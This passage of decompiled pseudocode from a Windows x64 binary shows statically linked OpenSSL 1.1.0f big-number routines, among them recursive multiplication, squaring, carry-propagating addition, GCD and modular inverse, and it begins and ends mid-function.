      v32 = 1;
      goto LABEL_10;
    case 8u:
      sub_14006F5F0((char *)a7, (char *)a2, v23, v30, v28);
      v15 = a6;
      sub_14006F5F0((char *)(a7 + v33 * 8), v34, (char *)a3, v27, a6);
      v14 = 0;
      goto LABEL_12;
    default:
LABEL_10:
      v14 = 0;
LABEL_11:
      v15 = a6;
LABEL_12:
      if ( v26 == 4 )
      {
        if ( !a5 && !v15 )
        {
          v24 = v9;
          v16 = (_QWORD *)(8 * v9 + a7);
          if ( v14 )
          {
            *v16 = 0i64;
            v16[1] = 0i64;
            v16[2] = 0i64;
            v16[3] = 0i64;
            v16[4] = 0i64;
            v16[5] = 0i64;
            v16[6] = 0i64;
            v16[7] = 0i64;
          }
          else
          {
            sub_140070E20((unsigned __int64 *)(8 * v9 + a7), (unsigned __int64 *)a7, (_QWORD *)(a7 + 32));
          }
          sub_140070E20(a1, a2, a3);
          v29 = (char *)&a1[v24];
          sub_140070E20(&a1[v24], a2 + 4, a3 + 4);
          goto LABEL_34;
        }
        goto LABEL_30;
      }
      if ( v26 != 8 || a5 || v15 )
      {
LABEL_30:
        v16 = (_QWORD *)(8 * v9 + a7);
        v31 = a7 + 16i64 * (_DWORD)v9;
        if ( v14 )
          memset((void *)(8 * v9 + a7), 0, 8 * v9);
        else
          sub_14006F030(8 * v9 + a7, a7, a7 + v33 * 8, v26, 0, 0, a7 + 16i64 * (_DWORD)v9);
        sub_14006F030((_DWORD)a1, (_DWORD)a2, (_DWORD)a3, v26, 0, 0, v31);
        v29 = (char *)&a1[v9];
        sub_14006F030((_DWORD)v29, (_DWORD)v23, (_DWORD)v34, v26, a5, a6, v31);
        goto LABEL_34;
      }
      v25 = v9;
      v16 = (_QWORD *)(8 * v9 + a7);
      if ( v14 )
        memset(v16, 0, 0x80ui64);
      else
        sub_1400715D0(v16, (unsigned __int64 *)a7, (_QWORD *)(a7 + 64));
      sub_1400715D0(a1, a2, a3);
      v29 = (char *)&a1[v25];
      sub_1400715D0(&a1[v25], a2 + 8, a3 + 8);
LABEL_34:
      v17 = sub_140070880((char *)a7, (char *)a1, v29, v9);
      if ( v32 )
        v18 = v17 - sub_140075060((char *)v16, (char *)a7, (char *)v16, v9);
      else
        v18 = sub_140070880((char *)v16, (char *)v16, (char *)a7, v9) + v17;
      result = sub_140070880((char *)&a1[v33], (char *)&a1[v33], (char *)v16, v9);
      v19 = result + v18;
      if ( v19 )
      {
        result = (unsigned int)(v9 + v26);
        v20 = &a1[(int)result];
        v21 = v19 + *v20;
        *v20 = v21;
        if ( v21 < v19 )
        {
          do
          {
            v22 = v20[1]++ == -1i64;
            ++v20;
          }
          while ( v22 );
        }
      }
      return result;
  }
}

//----- (000000014006F5F0) ----------------------------------------------------
__int64 __fastcall sub_14006F5F0(char *a1, char *a2, char *a3, int a4, int a5)
{
  __int64 v5; // rbp
  __int64 result; // rax
  int v10; // r10d
  __int64 v11; // r11
  char *v12; // rbx
  char *v13; // rsi
  char *v14; // rdi
  bool v15; // zf
  int v16; // r10d
  __int64 v17; // rcx
  int v18; // r10d
  __int64 v19; // rcx
  int v20; // r10d
  __int64 v21; // rcx
  __int64 v22; // rcx
  __int64 v23; // rax
  int v24; // r10d
  __int64 v25; // rcx
  int v26; // r10d
  __int64 v27; // rdx
  __int64 v28; // rcx
  __int64 v29; // rax
  int v30; // r10d
  __int64 v31; // rcx
  __int64 v32; // rax
  int v33; // r10d
  _QWORD *v34; // rdx
  signed __int64 v35; // rsi
  _QWORD *v36; // rcx
  int v37; // r10d
  int v38; // r10d
  int v39; // r10d
  __int64 v40; // rax

  v5 = a4;
  result = sub_140075060(a1, a2, a3, a4);
  v10 = a5;
  v11 = result;
  if ( a5 )
  {
    v12 = &a1[8 * v5];
    v13 = &a2[8 * v5];
    v14 = &a3[8 * v5];
    if ( a5 >= 0 )
    {
      if ( result )
      {
        while ( 1 )
        {
          v22 = *(_QWORD *)v13;
          *(_QWORD *)v12 = *(_QWORD *)v13 - v11;
          v23 = 0i64;
          if ( !v22 )
            v23 = v11;
          v24 = v10 - 1;
          v11 = v23;
          if ( v24 <= 0 )
            break;
          v25 = *((_QWORD *)v13 + 1);
          v11 = 0i64;
          *((_QWORD *)v12 + 1) = v25 - v23;
          if ( !v25 )
            v11 = v23;
          v26 = v24 - 1;
          v27 = v11;
          if ( v26 <= 0 )
            break;
          v28 = *((_QWORD *)v13 + 2);
          v29 = v28 - v11;
          v11 = 0i64;
          *((_QWORD *)v12 + 2) = v29;
          if ( !v28 )
            v11 = v27;
          v30 = v26 - 1;
          if ( v30 <= 0 )
            break;
          v31 = *((_QWORD *)v13 + 3);
          *((_QWORD *)v12 + 3) = v31 - v11;
          v32 = 0i64;
          if ( !v31 )
            v32 = v11;
          v10 = v30 - 1;
          v11 = v32;
          if ( v10 <= 0 )
            break;
          v13 += 32;
          v12 += 32;
          if ( !v32 )
            goto LABEL_30;
        }
      }
      else
      {
LABEL_30:
        if ( v10 > 0 )
        {
          v33 = v10 - 1;
          *(_QWORD *)v12 = *(_QWORD *)v13;
          if ( v33 > 0 )
          {
            v34 = v13 + 16;
            v35 = v13 - v12;
            v36 = v12 + 16;
            do
            {
              v37 = v33 - 1;
              *(v36 - 1) = *(v34 - 1);
              if ( v37 <= 0 )
                break;
              v38 = v37 - 1;
              *v36 = *v34;
              if ( v38 <= 0 )
                break;
              v39 = v38 - 1;
              v36[1] = v34[1];
              if ( v39 <= 0 )
                break;
              v40 = *(_QWORD *)((char *)v36 + v35 + 16);
              v36 += 4;
              v34 += 4;
              v33 = v39 - 1;
              *(v36 - 2) = v40;
            }
            while ( v33 > 0 );
          }
        }
      }
    }
    else
    {
      while ( 1 )
      {
        v15 = *(_QWORD *)v14 == 0i64;
        *(_QWORD *)v12 = -(*(_QWORD *)v14 + v11);
        if ( !v15 )
          v11 = 1i64;
        v16 = v10 + 1;
        if ( v16 >= 0 )
          break;
        v17 = *((_QWORD *)v14 + 1);
        *((_QWORD *)v12 + 1) = -(v17 + v11);
        if ( v17 )
          v11 = 1i64;
        v18 = v16 + 1;
        if ( v18 >= 0 )
          break;
        v19 = *((_QWORD *)v14 + 2);
        *((_QWORD *)v12 + 2) = -(v19 + v11);
        if ( v19 )
          v11 = 1i64;
        v20 = v18 + 1;
        if ( v20 >= 0 )
          break;
        v21 = *((_QWORD *)v14 + 3);
        *((_QWORD *)v12 + 3) = -(v21 + v11);
        if ( v21 )
          v11 = 1i64;
        v10 = v20 + 1;
        if ( v10 >= 0 )
          break;
        v14 += 32;
        v12 += 32;
      }
    }
    return v11;
  }
  return result;
}

//----- (000000014006F810) ----------------------------------------------------
__int64 __fastcall sub_14006F810(__int64 a1, __int64 a2, int *a3)
{
  unsigned __int64 v3; // rdi
  unsigned int v4; // ebp
  __int64 result; // rax
  _QWORD *v9; // rbx
  unsigned __int64 **v10; // rax
  unsigned __int64 **v11; // r15
  int v12; // r13d
  unsigned __int64 *v13; // r9
  int v14; // edx
  __int64 v15; // rdx
  char v16; // [rsp+20h] [rbp-148h] BYREF

  v3 = *(int *)(a2 + 8);
  v4 = 0;
  if ( (int)v3 <= 0 )
  {
    *(_DWORD *)(a1 + 8) = 0;
    result = 1i64;
    *(_DWORD *)(a1 + 16) = 0;
    return result;
  }
  sub_140027D40(a3);
  if ( a2 == a1 )
    v9 = sub_140027C40(a3);
  else
    v9 = (_QWORD *)a1;
  v10 = (unsigned __int64 **)sub_140027C40(a3);
  v11 = v10;
  if ( v9 )
  {
    if ( v10 )
    {
      v12 = 2 * v3;
      if ( sub_140027B30((__int64)v9, 2 * (int)v3) )
      {
        if ( (_DWORD)v3 == 4 )
        {
          sub_140073790((unsigned __int64 *)*v9, *(unsigned __int64 **)a2);
LABEL_21:
          *((_DWORD *)v9 + 4) = 0;
          v15 = *(_QWORD *)(*(_QWORD *)a2 + 8i64 * ((int)v3 - 1));
          if ( v15 == (unsigned int)v15 )
            *((_DWORD *)v9 + 2) = v12 - 1;
          else
            *((_DWORD *)v9 + 2) = v12;
          if ( (_QWORD *)a1 == v9 || sub_140026E90(a1, (__int64)v9) )
            v4 = 1;
          goto LABEL_27;
        }
        if ( (_DWORD)v3 == 8 )
        {
          sub_140073C60((unsigned __int64 *)*v9, *(unsigned __int64 **)a2);
          goto LABEL_21;
        }
        if ( (int)v3 < 16 )
        {
          v13 = (unsigned __int64 *)&v16;
LABEL_20:
          sub_14006F9D0((char *)*v9, *(char **)a2, v3, v13);
          goto LABEL_21;
        }
        v14 = 1 << (sub_1400272A0(v3) - 1);
        if ( (_DWORD)v3 == v14 )
        {
          if ( sub_140027B30((__int64)v11, 4 * v14) )
          {
            sub_14006FAE0((unsigned __int64 *)*v9, *(unsigned __int64 **)a2, v3, *v11);
            goto LABEL_21;
          }
        }
        else if ( sub_140027B30((__int64)v11, v12) )
        {
          v13 = *v11;
          goto LABEL_20;
        }
      }
    }
  }
LABEL_27:
  sub_140027B60((__int64)a3);
  return v4;
}

//----- (000000014006F9D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14006F9D0(char *a1, char *a2, int a3, unsigned __int64 *a4)
{
  int v4; // r14d
  int v7; // esi
  char *v8; // rdi
  char *v10; // rbp
  int v11; // ebx
  __int64 v12; // r14
  unsigned __int64 v13; // r9

  v4 = 2 * a3;
  v7 = a3 - 1;
  v8 = a1 + 8;
  v10 = a2;
  *(_QWORD *)&a1[16 * a3 - 8] = 0i64;
  *(_QWORD *)a1 = 0i64;
  if ( a3 - 1 > 0 )
  {
    v10 = a2 + 8;
    *(_QWORD *)&v8[8 * v7] = sub_140073520(a1 + 8, a2 + 8, v7, *(_QWORD *)a2);
    v8 += 16;
  }
  if ( a3 - 2 > 0 )
  {
    v11 = v7 - 1;
    v12 = 8i64 * v7;
    do
    {
      v13 = *(_QWORD *)v10;
      v12 -= 8i64;
      v10 += 8;
      --v7;
      --v11;
      *(_QWORD *)&v8[v12] = sub_140070B50(v8, v10, v7, v13);
      v8 += 16;
    }
    while ( v11 > 0 );
    v4 = 2 * a3;
  }
  sub_140070880(a1, a1, a1, v4);
  sub_140074ED0(a4, (unsigned __int64 *)a2, a3);
  return sub_140070880(a1, a1, (char *)a4, v4);
}

//----- (000000014006FAE0) ----------------------------------------------------
unsigned __int64 *__fastcall sub_14006FAE0(unsigned __int64 *a1, unsigned __int64 *a2, int a3, unsigned __int64 *a4)
{
  __int64 v4; // rdi
  int v7; // eax
  __int64 v8; // rbp
  unsigned __int64 *result; // rax
  int v10; // eax
  __int64 v11; // rax
  int v12; // esi
  int v13; // esi
  unsigned __int64 v14; // rdx
  bool v15; // zf
  char *v16; // [rsp+20h] [rbp-48h]
  char *v17; // [rsp+28h] [rbp-40h]
  __int64 v18; // [rsp+30h] [rbp-38h]
  unsigned __int64 *v19; // [rsp+38h] [rbp-30h]
  int v20; // [rsp+38h] [rbp-30h]
  __int64 v21; // [rsp+40h] [rbp-28h]
  int v23; // [rsp+80h] [rbp+18h]

  v4 = a3;
  v7 = a3 / 2;
  v8 = a3 / 2;
  if ( a3 == 4 )
    return (unsigned __int64 *)sub_140073790(a1, a2);
  if ( a3 == 8 )
    return (unsigned __int64 *)sub_140073C60(a1, a2);
  if ( a3 < 16 )
    return (unsigned __int64 *)sub_14006F9D0((char *)a1, (char *)a2, a3, a4);
  v21 = v7;
  v16 = (char *)&a2[v8];
  v10 = sub_140027860((__int64)a2, (__int64)v16, v7);
  v23 = 0;
  if ( v10 <= 0 )
  {
    if ( v10 >= 0 )
      v23 = 1;
    else
      sub_140075060((char *)a4, v16, (char *)a2, v8);
  }
  else
  {
    sub_140075060((char *)a4, (char *)a2, v16, v8);
  }
  v11 = v4;
  v18 = v4;
  v19 = &a4[2 * (int)v4];
  v17 = (char *)&a4[v4];
  if ( v23 )
    memset(&a4[v11], 0, 8 * v4);
  else
    sub_14006FAE0(&a4[v11], a4, (unsigned int)v8, &a4[2 * (int)v4]);
  sub_14006FAE0(a1, a2, (unsigned int)v8, v19);
  sub_14006FAE0(&a1[v18], v16, (unsigned int)v8, v19);
  v20 = sub_140070880((char *)a4, (char *)a1, (char *)&a1[v18], v4);
  v12 = v20 - sub_140075060(v17, (char *)a4, v17, v4);
  result = (unsigned __int64 *)sub_140070880((char *)&a1[v21], (char *)&a1[v21], v17, v4);
  v13 = (_DWORD)result + v12;
  if ( v13 )
  {
    result = &a1[(int)v4 + (int)v8];
    v14 = v13 + *result;
    *result = v14;
    if ( v14 < v13 )
    {
      do
      {
        v15 = result[1]++ == -1i64;
        ++result;
      }
      while ( v15 );
    }
  }
  return result;
}

//----- (000000014006FCE0) ----------------------------------------------------
__int64 __fastcall sub_14006FCE0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v8; // edi
  _QWORD *v9; // rsi
  _QWORD *v10; // rax
  __int64 v11; // rbx
  _QWORD *v12; // rax
  __int64 *v13; // rax

  v8 = 0;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = sub_140027C40(a4);
  v11 = (__int64)v10;
  if ( v9 && v10 && sub_140026E90((__int64)v9, a2) && sub_140026E90(v11, a3) )
  {
    *((_DWORD *)v9 + 4) = 0;
    *(_DWORD *)(v11 + 16) = 0;
    if ( (int)sub_140026AB0((__int64)v9, (__int64 *)v11) < 0 )
    {
      v12 = v9;
      v9 = (_QWORD *)v11;
      v11 = (__int64)v12;
    }
    v13 = sub_140070110(v9, v11);
    if ( v13 && sub_140026E90(a1, (__int64)v13) )
      v8 = 1;
  }
  sub_140027B60((__int64)a4);
  return v8;
}

//----- (000000014006FDD0) ----------------------------------------------------
_DWORD *__fastcall sub_14006FDD0(_DWORD *a1, __int64 a2, __int64 *a3, int *a4)
{
  _DWORD *result; // rax
  _DWORD *v5; // rbx
  int v6[6]; // [rsp+30h] [rbp-18h] BYREF

  result = sub_140070220(a1, a2, a3, a4, v6);
  v5 = result;
  if ( v6[0] )
  {
    sub_140024610(3, 110, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gcd.c", 131);
    return v5;
  }
  return result;
}
// 14006FDD0: using guessed type int var_18[6];

//----- (000000014006FE30) ----------------------------------------------------
_DWORD *__fastcall sub_14006FE30(_DWORD *a1, __int64 a2, __int64 a3, int *a4)
{
  _DWORD *v6; // rbx
  _QWORD *v7; // r14
  _QWORD *v8; // rsi
  _QWORD *v9; // r13
  _QWORD *v10; // r12
  _QWORD *v11; // rdi
  _DWORD *v12; // rax
  _QWORD *v13; // rax
  _DWORD *v14; // rbp
  int v15; // ebp
  __int64 v16; // rbx
  __int64 v17; // rcx
  __int64 *v18; // rsi
  bool v19; // zf
  __int64 v21; // [rsp+30h] [rbp-68h]
  _QWORD *v22; // [rsp+38h] [rbp-60h]
  char v23[88]; // [rsp+40h] [rbp-58h] BYREF

  v6 = 0i64;
  sub_140027D40(a4);
  v7 = sub_140027C40(a4);
  v8 = sub_140027C40(a4);
  v9 = sub_140027C40(a4);
  v22 = sub_140027C40(a4);
  v10 = sub_140027C40(a4);
  v11 = sub_140027C40(a4);
  if ( !sub_140027C40(a4) )
    goto LABEL_29;
  v12 = a1;
  if ( !a1 )
    v12 = sub_140027200();
  v21 = (__int64)v12;
  v6 = v12;
  if ( !v12 )
    goto LABEL_29;
  sub_140027560((__int64)v9, 1i64);
  sub_140027560((__int64)v11, 0i64);
  if ( !sub_140026E90((__int64)v8, a2) )
    goto LABEL_29;
  v13 = sub_140026E90((__int64)v7, a3);
  v14 = 0i64;
  if ( !v13 )
    goto LABEL_30;
  *((_DWORD *)v7 + 4) = 0;
  if ( *((_DWORD *)v8 + 4) || (int)sub_140027600(v8, v7) >= 0 )
  {
    sub_140027B10((__int64)v23);
    sub_140027660((__int64)v23, (__int64)v8, 4);
    if ( !(unsigned int)sub_1400798F0((__int64)v8, (__int64)v23, (__int64)v7, a4) )
      goto LABEL_30;
  }
  v15 = -1;
  if ( !sub_140027160((__int64)v8) )
  {
    while ( 1 )
    {
      sub_140027B10((__int64)v23);
      sub_140027660((__int64)v23, (__int64)v7, 4);
      if ( !(unsigned int)sub_140041D70(v22, (__int64)v10, (__int64)v23, (__int64)v8, a4) )
        break;
      v16 = (__int64)v7;
      v17 = (__int64)v7;
      v7 = v8;
      v8 = v10;
      if ( !(unsigned int)sub_14006E5B0(v17, (__int64)v22, (__int64)v9, a4)
        || !(unsigned int)sub_140041A10(v16, v16, (__int64)v11) )
      {
        break;
      }
      v10 = v11;
      v11 = v9;
      v15 = -v15;
      v9 = (_QWORD *)v16;
      if ( sub_140027160((__int64)v8) )
      {
        if ( v15 < 0 )
        {
          v6 = (_DWORD *)v21;
          goto LABEL_17;
        }
        v18 = (__int64 *)a3;
        goto LABEL_20;
      }
    }
LABEL_28:
    v6 = (_DWORD *)v21;
    goto LABEL_29;
  }
LABEL_17:
  v18 = (__int64 *)a3;
  if ( (unsigned int)sub_140041AC0((__int64)v11, a3, (__int64)v11) )
  {
LABEL_20:
    if ( sub_140027110((__int64)v7) )
    {
      if ( *((_DWORD *)v11 + 4) || (int)sub_140027600(v11, v18) >= 0 )
      {
        v6 = (_DWORD *)v21;
        v19 = (unsigned int)sub_1400798F0(v21, (__int64)v11, (__int64)v18, a4) == 0;
      }
      else
      {
        v6 = (_DWORD *)v21;
        v19 = sub_140026E90(v21, (__int64)v11) == 0i64;
      }
      if ( !v19 )
      {
        v14 = v6;
        goto LABEL_32;
      }
      goto LABEL_29;
    }
    sub_140024610(3, 139, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gcd.c", 606);
    goto LABEL_28;
  }
LABEL_29:
  v14 = 0i64;
LABEL_30:
  if ( !a1 )
    sub_140026FF0(v6);
LABEL_32:
  sub_140027B60((__int64)a4);
  return v14;
}

//----- (0000000140070110) ----------------------------------------------------
__int64 *__fastcall sub_140070110(__int64 *a1, __int64 a2)
{
  __int64 *v3; // rdi
  int v4; // esi
  __int64 v5; // rdx
  __int64 v6; // rcx
  BOOL v7; // eax
  __int64 *v8; // rax

  v3 = (__int64 *)a2;
  v4 = 0;
  if ( sub_140027160(a2) )
    return a1;
  do
  {
    if ( sub_1400270F0((__int64)a1) )
    {
      if ( sub_1400270F0((__int64)v3) )
      {
        if ( !(unsigned int)sub_140041AC0((__int64)a1, (__int64)a1, (__int64)v3) )
          return 0i64;
        v5 = (__int64)a1;
        v6 = (__int64)a1;
      }
      else
      {
        v5 = (__int64)v3;
        v6 = (__int64)v3;
      }
LABEL_8:
      if ( !(unsigned int)sub_140047230(v6, v5) )
        return 0i64;
      if ( (int)sub_140026AB0((__int64)a1, v3) < 0 )
      {
        v8 = a1;
        a1 = v3;
        v3 = v8;
      }
      continue;
    }
    v7 = sub_1400270F0((__int64)v3);
    v5 = (__int64)a1;
    v6 = (__int64)a1;
    if ( v7 )
      goto LABEL_8;
    if ( !(unsigned int)sub_140047230((__int64)a1, (__int64)a1)
      || !(unsigned int)sub_140047230((__int64)v3, (__int64)v3) )
    {
      return 0i64;
    }
    ++v4;
  }
  while ( !sub_140027160((__int64)v3) );
  if ( v4 && !(unsigned int)sub_140046E40((__int64)a1, a1, v4) )
    return 0i64;
  return a1;
}

//----- (0000000140070220) ----------------------------------------------------
_DWORD *__fastcall sub_140070220(_DWORD *a1, __int64 a2, __int64 *a3, int *a4, _DWORD *a5)
{
  _QWORD *v9; // r14
  _QWORD *v10; // rbp
  __int64 *v11; // rbx
  __int64 *v12; // r15
  _QWORD *v13; // r12
  _QWORD *v14; // rsi
  _DWORD *v15; // rax
  int v16; // edi
  _DWORD *v17; // r15
  int v18; // edi
  __int64 v19; // r8
  __int64 v20; // rdx
  __int64 v21; // rcx
  int v22; // edi
  int v23; // eax
  int v24; // edi
  __int64 v25; // rdi
  __int64 v26; // rdx
  int v27; // eax
  int v28; // edi
  _DWORD *v29; // rbp
  __int64 v30; // rbx
  bool v31; // zf
  int v33; // [rsp+30h] [rbp-58h]
  __int64 v34; // [rsp+38h] [rbp-50h]
  __int64 *v35; // [rsp+40h] [rbp-48h]

  if ( a5 )
    *a5 = 0;
  if ( (unsigned int)sub_140027070(a2, 4u) || (unsigned int)sub_140027070((__int64)a3, 4u) )
    return sub_14006FE30(a1, a2, (__int64)a3, a4);
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = sub_140027C40(a4);
  v11 = sub_140027C40(a4);
  v12 = sub_140027C40(a4);
  v13 = sub_140027C40(a4);
  v14 = sub_140027C40(a4);
  v35 = sub_140027C40(a4);
  if ( !v35 )
  {
    v30 = (__int64)a4;
    v17 = 0i64;
    v15 = 0i64;
    goto LABEL_89;
  }
  v15 = a1;
  if ( !a1 )
    v15 = sub_140027200();
  v34 = (__int64)v15;
  if ( !v15 )
  {
    v30 = (__int64)a4;
    v17 = 0i64;
    goto LABEL_89;
  }
  sub_140027560((__int64)v11, 1i64);
  sub_140027560((__int64)v14, 0i64);
  if ( !sub_140026E90((__int64)v10, a2) || !sub_140026E90((__int64)v9, (__int64)a3) )
    goto LABEL_83;
  *((_DWORD *)v9 + 4) = 0;
  if ( (*((_DWORD *)v10 + 4) || (int)sub_140027600(v10, v9) >= 0)
    && !(unsigned int)sub_1400798F0((__int64)v10, (__int64)v10, (__int64)v9, a4) )
  {
    goto LABEL_83;
  }
  v33 = -1;
  if ( sub_1400270F0((__int64)a3) && (int)sub_140027260((__int64)a3) <= 2048 )
  {
    if ( !sub_140027160((__int64)v10) )
    {
      while ( 1 )
      {
        v16 = 0;
        if ( !(unsigned int)sub_1400270A0((__int64)v10, 0) )
          break;
LABEL_24:
        v17 = 0i64;
        v18 = 0;
        if ( !(unsigned int)sub_1400270A0((__int64)v9, 0) )
        {
          while ( 1 )
          {
            ++v18;
            if ( sub_1400270F0((__int64)v14) && !(unsigned int)sub_140041BA0((__int64)v14, (__int64)v14, (__int64)a3) )
              goto LABEL_84;
            if ( !(unsigned int)sub_140047230((__int64)v14, (__int64)v14) )
              goto LABEL_84;
            if ( (unsigned int)sub_1400270A0((__int64)v9, v18) )
            {
              if ( v18 > 0 && !(unsigned int)sub_140047090((__int64)v9, (__int64)v9, v18) )
                goto LABEL_84;
              break;
            }
          }
        }
        if ( (int)sub_140027600(v10, v9) < 0 )
        {
          if ( !(unsigned int)sub_140041BA0((__int64)v14, (__int64)v14, (__int64)v11) )
            goto LABEL_84;
          v19 = (__int64)v10;
          v20 = (__int64)v9;
          v21 = (__int64)v9;
        }
        else
        {
          if ( !(unsigned int)sub_140041BA0((__int64)v11, (__int64)v11, (__int64)v14) )
            goto LABEL_84;
          v19 = (__int64)v9;
          v20 = (__int64)v10;
          v21 = (__int64)v10;
        }
        if ( !(unsigned int)sub_140041C70(v21, v20, v19) )
          goto LABEL_84;
        if ( sub_140027160((__int64)v10) )
          goto LABEL_73;
      }
      while ( 1 )
      {
        ++v16;
        if ( sub_1400270F0((__int64)v11) && !(unsigned int)sub_140041BA0((__int64)v11, (__int64)v11, (__int64)a3) )
          break;
        if ( !(unsigned int)sub_140047230((__int64)v11, (__int64)v11) )
          break;
        if ( (unsigned int)sub_1400270A0((__int64)v10, v16) )
        {
          if ( v16 > 0 && !(unsigned int)sub_140047090((__int64)v10, (__int64)v10, v16) )
            break;
          goto LABEL_24;
        }
      }
LABEL_83:
      v17 = 0i64;
LABEL_84:
      v30 = (__int64)a4;
LABEL_85:
      v15 = (_DWORD *)v34;
      goto LABEL_89;
    }
LABEL_72:
    v17 = 0i64;
    goto LABEL_73;
  }
  if ( sub_140027160((__int64)v10) )
    goto LABEL_72;
  do
  {
    v22 = sub_140027260((__int64)v10);
    if ( (unsigned int)sub_140027260((__int64)v9) == v22 )
    {
      if ( !(unsigned int)sub_140027560((__int64)v12, 1i64) )
        goto LABEL_83;
LABEL_42:
      v23 = sub_140041AC0((__int64)v13, (__int64)v9, (__int64)v10);
      goto LABEL_55;
    }
    v24 = sub_140027260((__int64)v10) + 1;
    if ( (unsigned int)sub_140027260((__int64)v9) == v24 )
    {
      if ( !(unsigned int)sub_140046FD0((__int64)v35, (__int64)v10) )
        goto LABEL_83;
      if ( (int)sub_140027600(v9, v35) < 0 )
      {
        if ( !(unsigned int)sub_140027560((__int64)v12, 1i64) )
          goto LABEL_83;
        goto LABEL_42;
      }
      if ( !(unsigned int)sub_140041AC0((__int64)v13, (__int64)v9, (__int64)v35)
        || !(unsigned int)sub_140041A10((__int64)v12, (__int64)v35, (__int64)v10) )
      {
        goto LABEL_83;
      }
      if ( (int)sub_140027600(v9, v12) >= 0 )
      {
        if ( !(unsigned int)sub_140027560((__int64)v12, 3i64) )
          goto LABEL_83;
        v23 = sub_140041AC0((__int64)v13, (__int64)v13, (__int64)v10);
      }
      else
      {
        v23 = sub_140027560((__int64)v12, 2i64);
      }
    }
    else
    {
      v23 = sub_140041D70(v12, (__int64)v13, (__int64)v9, (__int64)v10, a4);
    }
LABEL_55:
    if ( !v23 )
      goto LABEL_83;
    v25 = (__int64)v9;
    v9 = v10;
    v10 = v13;
    if ( sub_140027110((__int64)v12) )
    {
      v26 = (__int64)v11;
    }
    else
    {
      if ( sub_140027130((__int64)v12, 2i64) )
      {
        v27 = sub_140046FD0(v25, (__int64)v11);
      }
      else if ( sub_140027130((__int64)v12, 4i64) )
      {
        v27 = sub_140046E40(v25, v11, 2);
      }
      else if ( *((_DWORD *)v12 + 2) == 1 )
      {
        if ( !sub_140026E90(v25, (__int64)v11) )
          goto LABEL_83;
        v27 = sub_14003E8F0(v25, *(_QWORD *)*v12);
      }
      else
      {
        v27 = sub_14006E5B0(v25, (__int64)v12, (__int64)v11, a4);
      }
      if ( !v27 )
        goto LABEL_83;
      v26 = v25;
    }
    if ( !(unsigned int)sub_140041A10(v25, v26, (__int64)v14) )
      goto LABEL_83;
    v13 = v14;
    v14 = v11;
    v11 = (__int64 *)v25;
    v28 = -v33;
    v33 = -v33;
  }
  while ( !sub_140027160((__int64)v10) );
  v17 = 0i64;
  if ( v28 >= 0 )
    goto LABEL_74;
LABEL_73:
  if ( !(unsigned int)sub_140041AC0((__int64)v14, (__int64)a3, (__int64)v14) )
    goto LABEL_84;
LABEL_74:
  if ( !sub_140027110((__int64)v9) )
  {
    v30 = (__int64)a4;
    if ( a5 )
    {
      *a5 = 1;
      v15 = (_DWORD *)v34;
      goto LABEL_89;
    }
    goto LABEL_85;
  }
  if ( *((_DWORD *)v14 + 4) || (int)sub_140027600(v14, a3) >= 0 )
  {
    v30 = (__int64)a4;
    v29 = (_DWORD *)v34;
    v31 = (unsigned int)sub_1400798F0(v34, (__int64)v14, (__int64)a3, a4) == 0;
  }
  else
  {
    v29 = (_DWORD *)v34;
    v30 = (__int64)a4;
    v31 = sub_140026E90(v34, (__int64)v14) == 0i64;
  }
  if ( !v31 )
  {
    v17 = v29;
    goto LABEL_91;
  }
  v15 = v29;
LABEL_89:
  if ( !a1 )
    sub_140026FF0(v15);
LABEL_91:
  sub_140027B60(v30);
  return v17;
}

//----- (0000000140070880) ----------------------------------------------------
unsigned __int64 __fastcall sub_140070880(char *a1, char *a2, char *a3, int a4)
{
  int v4; // r11d
  unsigned __int64 v8; // r10
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // r8
  unsigned __int64 v11; // r9
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // r8
  unsigned __int64 v14; // r10
  unsigned __int64 v15; // rcx
  unsigned __int64 v16; // r8
  unsigned __int64 v17; // r9
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // r8
  signed __int64 v20; // rbx
  signed __int64 v21; // rdi
  __int64 v22; // rcx
  __int64 v23; // r8
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // r8

  v4 = a4;
  if ( a4 <= 0 )
    return 0i64;
  v8 = 0i64;
  if ( (a4 & 0xFFFFFFFC) != 0 )
  {
    do
    {
      v9 = v8 + *(_QWORD *)a2;
      v10 = v9 + *(_QWORD *)a3;
      *(_QWORD *)a1 = v10;
      v11 = (v10 < v9) + (unsigned __int64)(v9 < v8);
      v12 = v11 + *((_QWORD *)a2 + 1);
      v13 = v12 + *((_QWORD *)a3 + 1);
      *((_QWORD *)a1 + 1) = v13;
      v14 = (v13 < v12) + (unsigned __int64)(v12 < v11);
      v15 = v14 + *((_QWORD *)a2 + 2);
      v16 = v15 + *((_QWORD *)a3 + 2);
      *((_QWORD *)a1 + 2) = v16;
      v17 = (v16 < v15) + (unsigned __int64)(v15 < v14);
      v18 = v17 + *((_QWORD *)a2 + 3);
      v19 = v18 + *((_QWORD *)a3 + 3);
      *((_QWORD *)a1 + 3) = v19;
      v8 = (v19 < v18) + (unsigned __int64)(v18 < v17);
      a2 += 32;
      a3 += 32;
      a1 += 32;
      v4 -= 4;
    }
    while ( (v4 & 0xFFFFFFFC) != 0 );
  }
  if ( v4 )
  {
    v20 = a3 - a2;
    v21 = a1 - a2;
    do
    {
      v22 = *(_QWORD *)a2;
      v23 = *(_QWORD *)&a2[v20];
      a2 += 8;
      v24 = v8 + v22;
      v25 = v24 + v23;
      *(_QWORD *)&a2[v21 - 8] = v25;
      v8 = (v25 < v24) + (unsigned __int64)(v24 < v8);
      --v4;
    }
    while ( v4 );
  }
  return v8;
}

//----- (00000001400709C0) ----------------------------------------------------
__int64 __fastcall sub_1400709C0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  int v3; // eax
  __int64 v4; // rbp
  int v5; // r14d
  unsigned __int64 v6; // rsi
  int v10; // eax
  unsigned __int64 v11; // r9
  char v12; // r10
  unsigned __int64 v13; // r11
  __int64 v14; // rdx
  __int64 v15; // r10
  unsigned __int64 v16; // r8
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // r8
  __int64 v20; // rcx
  unsigned __int64 v21; // rax
